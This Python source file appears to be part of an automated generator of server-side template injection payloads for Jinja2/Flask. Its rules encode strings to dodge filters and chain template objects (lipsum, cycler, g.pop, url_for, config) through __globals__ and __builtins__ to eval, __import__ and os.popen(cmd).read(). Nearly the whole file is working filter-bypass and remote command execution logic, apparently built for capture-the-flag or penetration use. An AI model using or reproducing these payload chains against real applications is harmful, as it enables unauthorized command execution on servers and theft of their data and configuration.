def gen_string_u1(context: dict, value: str):
    if any(ord(c) >= 128 for c in value):
        return [(UNSATISFIED,)]
    target = "".join("\\u00" + hex(ord(c))[2:] for c in value)
    target_list = [(LITERAL, "'{}'".format(target))]
    return [(EXPRESSION, precedence["literal"], target_list)]


@expression_gen
def gen_string_u2(context: dict, value: str):
    if any(ord(c) >= 128 for c in value):
        return [(UNSATISFIED,)]
    target = "".join("\\u00" + hex(ord(c))[2:] for c in value)
    target_list = [(LITERAL, "'{}'".format(target))]
    return [(EXPRESSION, precedence["literal"], target_list)]


@expression_gen
def gen_string_o1(context: dict, value: str):
    if any(ord(c) >= 128 for c in value):
        return [(UNSATISFIED,)]
    target = "".join("\\" + oct(ord(c))[2:] for c in value)
    target_list = [(LITERAL, "'{}'".format(target))]
    return [(EXPRESSION, precedence["literal"], target_list)]


@expression_gen
def gen_string_o2(context: dict, value: str):
    if any(ord(c) >= 128 for c in value):
        return [(UNSATISFIED,)]
    target = "".join("\\" + oct(ord(c))[2:] for c in value)
    target_list = [(LITERAL, "'{}'".format(target))]
    return [(EXPRESSION, precedence["literal"], target_list)]


@expression_gen
def gen_string_splitdictjoin(context: dict, value: str):
    if not re.match("^[a-zA-Z_]+$", value):
        return [(UNSATISFIED,)]
    parts = [value[i : i + 3] for i in range(0, len(value), 3)]

    if len(set(parts)) != len(parts):
        return [(UNSATISFIED,)]

    target_list = [
        (LITERAL, "dict({})|join".format(",".join(f"{part}=x" for part in parts)))
    ]
    return [(EXPRESSION, precedence["filter"], target_list)]


@expression_gen
def gen_string_splitdictjoin2(context: dict, value: str):
    if not re.match("^[a-zA-Z_]+$", value):
        return [(UNSATISFIED,)]
    parts = [value[i : i + 3] for i in range(0, len(value), 3)]
    targets = [(LITERAL, "dict({}=x)|join".format(part)) for part in parts]
    strings = [(EXPRESSION, precedence["filter"], [target]) for target in targets]
    return [(STRING_CONCATMANY, strings)]


@expression_gen
def gen_string_splitdictjoin3(context: dict, value: str):
    if not re.match("^[a-zA-Z_]+$", value):
        return [(UNSATISFIED,)]

    if len(set(value)) != len(value):
        return [(UNSATISFIED,)]

    target_list = [
        (LITERAL, "dict({})|join".format(",".join(f"{part}=x" for part in value)))
    ]
    return [(EXPRESSION, precedence["filter"], target_list)]


@expression_gen
def gen_string_formatpercent(context: dict, value: str):
    # (('%c'*n)%(97,98,99))
    number_tuple = (
        [(LITERAL, "(")]
        + join_target((LITERAL, ","), [(INTEGER, ord(c)) for c in value])
        + [(LITERAL, ")")]
    )
    return [
        (
            MOD,
            (STRING_MANY_PERCENT_LOWER_C, len(value)),
            (EXPRESSION, precedence["literal"], number_tuple),
        )
    ]


@expression_gen
def gen_string_formatfunc(context: dict, value: str):
    # ('%c'*n)|format(97,98,99)
    req = []
    manypc = (STRING_MANY_PERCENT_LOWER_C, len(value))
    req.append((ENCLOSE_UNDER, precedence["filter"], manypc))
    req.append((LITERAL, "|format("))
    req += join_target((LITERAL, ","), [(INTEGER, ord(c)) for c in value])
    req.append((LITERAL, ")"))
    return [(EXPRESSION, precedence["filter"], req)]


@expression_gen
def gen_string_formatfunc2(context: dict, value: str):
    # (FORMAT(97,98,99))
    # FORMAT = (CS.format)
    # CS = (C*L)
    if re.match("^[a-z]+$", value):  # avoid infinite recursion
        return [(UNSATISFIED,)]
    if "{:c}" not in context.values():
        return [(UNSATISFIED,)]
    k = [k for k, v in context.values() if v == "{:c}"][0]
    k = (EXPRESSION, precedence["literal"], (LITERAL, k))
    cs = (MULTIPLY, k, (INTEGER, len(value)))
    format_func = (ATTRIBUTE, (LITERAL, cs), "format")
    target_list = (
        [
            (ENCLOSE_UNDER, precedence["function_call"], format_func),
            (LITERAL, "("),
        ]
        + join_target((LITERAL, ","), [(INTEGER, ord(c)) for c in value])
        + [
            (LITERAL, ")"),
        ]
    )
    return [(EXPRESSION, precedence["function_call"], target_list)]


@expression_gen
def gen_string_formatfunc3(context: dict, value: str):
    # (FORMAT(97,98,99))
    # FORMAT = (CS.format)
    # CS = (C*L)
    logger.debug("gen_string_formatfunc3: %s", value)
    if re.match("^[a-z]+$", value):  # avoid infinite recursion
        return [(UNSATISFIED,)]
    format_func = (ATTRIBUTE, (STRING_MANY_FORMAT_C, len(value)), "format")
    target_list = (
        [
            (ENCLOSE_UNDER, precedence["function_call"], format_func),
            (LITERAL, "("),
        ]
        + join_target((LITERAL, ","), [(INTEGER, ord(c)) for c in value])
        + [
            (LITERAL, ")"),
        ]
    )
    return [(EXPRESSION, precedence["function_call"], target_list)]


@expression_gen
def gen_string_chars(context: dict, value: str):
    targets = [(CHAR, c) for c in value]
    return [(STRING_CONCATMANY, targets)]


@expression_gen
def gen_string_chars2(context: dict, value: str):
    target_list = (
        [(LITERAL, "(")]
        + join_target((LITERAL, ","), [(CHAR, c) for c in value])
        + [(LITERAL, ")|join")]
    )
    return [(EXPRESSION, precedence["filter"], target_list)]


@expression_gen
def gen_string_stringaschars(context: dict, value: str):
    if len(value) <= 1 or re.match("^[a-zA-Z][a-zA-Z0-9]+$", value):
        return [(UNSATISFIED,)]
    targets = []
    while value:
        regexp = re.match("^[a-zA-Z][a-zA-Z0-9]{2}", value)
        if regexp:
            targets.append((STRING, regexp.group(0)))
            value = value[len(regexp.group(0)) :]
        else:
            targets.append((STRING, value[0]))
            value = value[1:]
    return [(STRING_CONCATMANY, targets)]


# ---


@expression_gen
def gen_attribute_normal1(context, obj_req, attr_name):
    if not re.match("[A-Za-z_]([A-Za-z0-9_]+)?", attr_name):
        return [(UNSATISFIED,)]
    target_list = [
        (ENCLOSE_UNDER, precedence["attribute"], obj_req),
        (LITERAL, "."),
        (LITERAL, attr_name),
    ]
    return [(EXPRESSION, precedence["attribute"], target_list)]


@expression_gen
def gen_attribute_normal2(context, obj_req, attr_name):
    target_list = [
        (ENCLOSE_UNDER, precedence["attribute"], obj_req),
        (LITERAL, "["),
        (STRING, attr_name),
        (LITERAL, "]"),
    ]
    return [(EXPRESSION, precedence["attribute"], target_list)]


@expression_gen
def gen_attribute_attrfilter(context, obj_req, attr_name):
    target_list = [
        (ENCLOSE_UNDER, precedence["filter"], obj_req),
        (LITERAL, "|attr("),
        (STRING, attr_name),
        (LITERAL, ")"),
    ]
    return [(EXPRESSION, precedence["filter"], target_list)]


@expression_gen
def gen_attribute_attrfilter2(context, obj_req, attr_name):
    target_list = [
        (ENCLOSE_UNDER, precedence["filter"], obj_req),
        (LITERAL, "|attr("),
        (STRING, attr_name),
        (LITERAL, ",)"),
    ]
    return [(EXPRESSION, precedence["filter"], target_list)]


# ---


@expression_gen
def gen_item_normal1(context, obj_req, item_name):
    if not re.match("[A-Za-z_]([A-Za-z0-9_]+)?", item_name):
        return [(UNSATISFIED,)]
    target_list = [
        (ENCLOSE_UNDER, precedence["item"], obj_req),
        (LITERAL, "."),
        (LITERAL, item_name),
    ]
    return [(EXPRESSION, precedence["item"], target_list)]


@expression_gen
def gen_item_normal2(context, obj_req, item_name):
    target_list = [
        (ENCLOSE_UNDER, precedence["item"], obj_req),
        (LITERAL, "["),
        (STRING, item_name),
        (LITERAL, "]"),
    ]
    return [(EXPRESSION, precedence["item"], target_list)]


@expression_gen
def gen_item_dunderfunc(context, obj_req, item_name):
    target_list = [
        (
            ENCLOSE_UNDER,
            precedence["function_call"],
            (ATTRIBUTE, obj_req, "__getitem__"),
        ),
        (LITERAL, "("),
        (STRING, item_name),
        (LITERAL, ")"),
    ]
    return [(EXPRESSION, precedence["function_call"], target_list)]


@expression_gen
def gen_item_dunderfunc2(context, obj_req, item_name):
    target_list = [
        (
            ENCLOSE_UNDER,
            precedence["function_call"],
            (ATTRIBUTE, obj_req, "__getitem__"),
        ),
        (LITERAL, "("),
        (STRING, item_name),
        (LITERAL, ",)"),
    ]
    return [(EXPRESSION, precedence["function_call"], target_list)]


# ---


@expression_gen
def gen_class_attribute_literal(context, obj_req, attr_name):
    class_target = (
        ATTRIBUTE,
        obj_req,
        "__class__",
    )
    target_list = [
        (ENCLOSE_UNDER, precedence["attribute"], class_target),
        (LITERAL, "." + attr_name),
    ]
    return [(EXPRESSION, precedence["attribute"], target_list)]


@expression_gen
def gen_class_attribute_attrfilter(context, obj_req, attr_name):
    class_target = (
        ATTRIBUTE,
        obj_req,
        "__class__",
    )
    target_list = [
        (ENCLOSE_UNDER, precedence["filter"], class_target),
        (LITERAL, "|attr("),
        (STRING, attr_name),
        (LITERAL, ")"),
    ]
    return [(EXPRESSION, precedence["filter"], target_list)]


@expression_gen
def gen_class_attribute_attrfilter2(context, obj_req, attr_name):
    class_target = (
        ATTRIBUTE,
        obj_req,
        "__class__",
    )
    target_list = [
        (ENCLOSE_UNDER, precedence["filter"], class_target),
        (LITERAL, "|attr("),
        (STRING, attr_name),
        (LITERAL, ",)"),
    ]
    return [(EXPRESSION, precedence["filter"], target_list)]


# ---


@expression_gen
def gen_chained_attribute_item_normal(context, obj_req, *attr_item_req):
    if not attr_item_req:
        return [
            obj_req,
        ]
    first_req, *other_req = attr_item_req
    req_type, req_name = first_req
    got_req = (
        req_type,
        obj_req,
        req_name,
    )
    return [
        (
            CHAINED_ATTRIBUTE_ITEM,
            got_req,
            *other_req,
        ),
    ]


# ---


@expression_gen
def gen_import_func_g(context):
    return [
        (
            CHAINED_ATTRIBUTE_ITEM,
            (FLASK_CONTEXT_VAR, "g"),
            (ATTRIBUTE, "pop"),
            (ATTRIBUTE, "__globals__"),
            (ITEM, "__builtins__"),
            (ITEM, "__import__"),
        )
    ]


@expression_gen
def gen_import_func_lipsum(context):
    return [
        (
            CHAINED_ATTRIBUTE_ITEM,
            (JINJA_CONTEXT_VAR, "lipsum"),
            (ATTRIBUTE, "__globals__"),
            (ITEM, "__builtins__"),
            (ITEM, "__import__"),
        )
    ]


@expression_gen
def gen_import_func_joiner(context):
    return [
        (
            CHAINED_ATTRIBUTE_ITEM,
            (JINJA_CONTEXT_VAR, "joiner"),
            (ATTRIBUTE, "__init__"),
            (ATTRIBUTE, "__globals__"),
            (ITEM, "__builtins__"),
            (ITEM, "__import__"),
        )
    ]


@expression_gen
def gen_import_func_namespace(context):
    return [
        (
            CHAINED_ATTRIBUTE_ITEM,
            (JINJA_CONTEXT_VAR, "namespace"),
            (ATTRIBUTE, "__init__"),
            (ATTRIBUTE, "__globals__"),
            (ITEM, "__builtins__"),
            (ITEM, "__import__"),
        )
    ]


# ---


@expression_gen
def gen_eval_func_g(context):
    return [
        (
            CHAINED_ATTRIBUTE_ITEM,
            (FLASK_CONTEXT_VAR, "g"),
            (ATTRIBUTE, "pop"),
            (ATTRIBUTE, "__globals__"),
            (ITEM, "__builtins__"),
            (ITEM, "eval"),
        )
    ]


@expression_gen
def gen_eval_func_g_get(context):
    return [
        (
            CHAINED_ATTRIBUTE_ITEM,
            (FLASK_CONTEXT_VAR, "g"),
            (ATTRIBUTE, "get"),
            (ATTRIBUTE, "__globals__"),
            (ITEM, "__builtins__"),
            (ITEM, "eval"),
        )
    ]


@expression_gen
def gen_eval_func_session(context):
    return [
        (
            CHAINED_ATTRIBUTE_ITEM,
            (FLASK_CONTEXT_VAR, "session"),
            (ATTRIBUTE, "get"),
            (ATTRIBUTE, "__globals__"),
            (ITEM, "__builtins__"),
            (ITEM, "eval"),
        )
    ]


@expression_gen
def gen_eval_func_lipsum(context):
    return [
        (
            CHAINED_ATTRIBUTE_ITEM,
            (JINJA_CONTEXT_VAR, "lipsum"),
            (ATTRIBUTE, "__globals__"),
            (ITEM, "__builtins__"),
            (ITEM, "eval"),
        )
    ]


@expression_gen
def gen_eval_func_unexist(context):
    unexist = [
        [(LITERAL, "x")],
        [(LITERAL, "unexistfuckyou")],
    ] + [
        [(LITERAL, "".join(random.choices(string.ascii_lowercase, k=6)))]
        for _ in range(20)
    ]
    return [
        (
            CHAINED_ATTRIBUTE_ITEM,
            (EXPRESSION, precedence["literal"], [(ONEOF, *unexist)]),
            (ATTRIBUTE, "__init__"),
            (ATTRIBUTE, "__globals__"),
            (ITEM, "__builtins__"),
            (ITEM, "eval"),
        )
    ]


@expression_gen
def gen_eval_func_joiner(context):
    return [
        (
            CHAINED_ATTRIBUTE_ITEM,
            (JINJA_CONTEXT_VAR, "joiner"),
            (ATTRIBUTE, "__init__"),
            (ATTRIBUTE, "__globals__"),
            (ITEM, "__builtins__"),
            (ITEM, "eval"),
        )
    ]


@expression_gen
def gen_eval_func_cycler(context):
    return [
        (
            CHAINED_ATTRIBUTE_ITEM,
            (JINJA_CONTEXT_VAR, "cycler"),
            (ATTRIBUTE, "__init__"),
            (ATTRIBUTE, "__globals__"),
            (ITEM, "__builtins__"),
            (ITEM, "eval"),
        )
    ]


@expression_gen
def gen_eval_func_namespace(context):
    return [
        (
            CHAINED_ATTRIBUTE_ITEM,
            (JINJA_CONTEXT_VAR, "namespace"),
            (ATTRIBUTE, "__init__"),
            (ATTRIBUTE, "__globals__"),
            (ITEM, "__builtins__"),
            (ITEM, "eval"),
        )
    ]


@expression_gen
def gen_eval_func_request(context):
    return [
        (
            CHAINED_ATTRIBUTE_ITEM,
            (FLASK_CONTEXT_VAR, "request"),
            (ATTRIBUTE, "close"),
            (ATTRIBUTE, "__globals__"),
            (ITEM, "__builtins__"),
            (ITEM, "eval"),
        )
    ]


@expression_gen
def gen_eval_func_safesplit(context):
    return [
        (
            CHAINED_ATTRIBUTE_ITEM,
            (EXPRESSION, precedence["filter"], [(LITERAL, "()|safe")]),
            (ATTRIBUTE, "split"),
            (ATTRIBUTE, "__globals__"),
            (ITEM, "__builtins__"),
            (ITEM, "eval"),
        )
    ]


@expression_gen
def gen_eval_func_safejoin(context):
    return [
        (
            CHAINED_ATTRIBUTE_ITEM,
            (EXPRESSION, precedence["filter"], [(LITERAL, "()|safe")]),
            (ATTRIBUTE, "join"),
            (ATTRIBUTE, "__globals__"),
            (ITEM, "__builtins__"),
            (ITEM, "eval"),
        )
    ]


@expression_gen
def gen_eval_func_safelower(context):
    return [
        (
            CHAINED_ATTRIBUTE_ITEM,
            (EXPRESSION, precedence["filter"], [(LITERAL, "()|safe")]),
            (ATTRIBUTE, "lower"),
            (ATTRIBUTE, "__globals__"),
            (ITEM, "__builtins__"),
            (ITEM, "eval"),
        )
    ]


@expression_gen
def gen_eval_func_safezfill(context):
    return [
        (
            CHAINED_ATTRIBUTE_ITEM,
            (EXPRESSION, precedence["filter"], [(LITERAL, "()|safe")]),
            (ATTRIBUTE, "zfill"),
            (ATTRIBUTE, "__globals__"),
            (ITEM, "__builtins__"),
            (ITEM, "eval"),
        )
    ]


# ---


@expression_gen
def gen_eval_normal(context, eval_param):
    target_list = [
        (ENCLOSE_UNDER, precedence["function_call"], (EVAL_FUNC,)),
        (LITERAL, "("),
        eval_param,
        (LITERAL, ")"),
    ]
    return [(EXPRESSION, precedence["function_call"], target_list)]


@expression_gen
def gen_eval_normal2(context, eval_param):
    target_list = [
        (ENCLOSE_UNDER, precedence["function_call"], (EVAL_FUNC,)),
        (LITERAL, "("),
        eval_param,
        (LITERAL, ",)"),
    ]
    return [(EXPRESSION, precedence["function_call"], target_list)]


# ---

# 获取flask配置的生成规则


@expression_gen
def gen_config_flask_context_var(context):
    return [(EXPRESSION, precedence["literal"], [(FLASK_CONTEXT_VAR, "config")])]


@expression_gen
def gen_config_self(context):
    return [
        (
            CHAINED_ATTRIBUTE_ITEM,
            (JINJA_CONTEXT_VAR, "self"),
            (ATTRIBUTE, "__dict__"),
            (ITEM, "_TemplateReference__context"),
            (ITEM, "config"),
        )
    ]


# ---


@expression_gen
def gen_module_os_import(context):
    return [(FUNCTION_CALL, (IMPORT_FUNC,), [(STRING, "os")])]


@expression_gen
def gen_module_os_eval(context):
    return [(FUNCTION_CALL, (EVAL, (STRING, "__import__")), [(STRING, "os")])]


# 有500修正了，可以大胆加规则


@expression_gen
def gen_module_os_config(context):
    return [
        (
            CHAINED_ATTRIBUTE_ITEM,
            (CONFIG,),
            (CLASS_ATTRIBUTE, "__init__"),
            (ATTRIBUTE, "__globals__"),
            (ITEM, "os"),
        )
    ]


@expression_gen
def gen_module_os_gpop(context):
    return [
        (
            CHAINED_ATTRIBUTE_ITEM,
            (FLASK_CONTEXT_VAR, "g"),
            (ATTRIBUTE, "pop"),
            (ATTRIBUTE, "__globals__"),
            (ITEM, "os"),
        )
    ]


@expression_gen
def gen_module_os_gget(context):
    return [
        (
            CHAINED_ATTRIBUTE_ITEM,
            (FLASK_CONTEXT_VAR, "g"),
            (ATTRIBUTE, "get"),
            (ATTRIBUTE, "__globals__"),
            (ITEM, "os"),
        )
    ]


@expression_gen
def gen_module_os_urlfor(context):
    return [
        (
            CHAINED_ATTRIBUTE_ITEM,
            (FLASK_CONTEXT_VAR, "url_for"),
            (ATTRIBUTE, "__globals__"),
            (ITEM, "os"),
        )
    ]


# ---


@expression_gen
def gen_os_popen_obj_normal(context, cmd):
    return [(FUNCTION_CALL, (ATTRIBUTE, (MODULE_OS,), "popen"), [(STRING, cmd)])]


@expression_gen
def gen_os_popen_obj_eval(context, cmd):
    cmd = cmd.replace("'", "\\'")
    return [(EVAL, (STRING, "__import__('os').popen('" + cmd + "')"))]


# ---


@expression_gen
def gen_os_popen_read_normal(context, cmd):
    target_list = [
        (ATTRIBUTE, (OS_POPEN_OBJ, cmd), "read"),
        (ONEOF, [(LITERAL, "()")], [(LITERAL, "( )")]),
    ]
    return [(EXPRESSION, precedence["function_call"], target_list)]


@expression_gen
def gen_os_popen_read_normal2(context, cmd):
    return [(FUNCTION_CALL, (ATTRIBUTE, (OS_POPEN_OBJ, cmd), "read"), [(INTEGER, -1)])]


@expression_gen
def gen_os_popen_read_eval(context, cmd):
    return [
        (
            EVAL,
            (
                STRING,
                "__import__('os').popen('{}').read()".format(
                    str_escape(cmd, quote="'")
                ),
            ),
        ),
    ]
